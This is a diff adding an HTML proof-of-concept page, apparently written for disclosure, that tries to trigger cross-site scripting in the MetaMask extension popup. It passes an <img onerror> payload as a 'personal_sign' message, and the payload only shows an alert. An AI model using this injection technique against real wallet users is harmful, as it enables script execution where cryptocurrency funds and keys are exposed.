@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MetaMask XSS POC</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+</head>
+<body>
+    <h1>Click "Inject Payload" to trigger XSS in MetaMask Popup</h1>
+    <button id="btn">Inject Payload</button>
+
+    <script>
+        document.getElementById('btn').onclick = async () => {
+            // 1. Ensure Web3 provider is present (MetaMask installed)
+            if (typeof window.ethereum !== 'undefined') {
+                
+                // 2. Malicious Payload: HTML/JS to be executed inside the Extension Popup
+                // We use <img onerror> to trigger JS execution when the image fails to load.
+                const xssPayload = '<img src=x onerror=\'alert("XSS in MetaMask Popup! \\\\nContext: " + chrome.runtime.id)\' >';
+
+                // 3. Trigger the 'personal_sign' method
+                // This will open the MetaMask popup.
+                try {
+                    const message = xssPayload;
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const account = accounts[0];
+
+                    await window.ethereum.request({
+                        method: 'personal_sign',
+                        params: [message, account]
+                    });
+                } catch (err) {
+                    console.error(err);
+                }
+            } else {
+                alert("MetaMask not installed.");
+            }
+        };
+    </script>
+</body>
+</html>
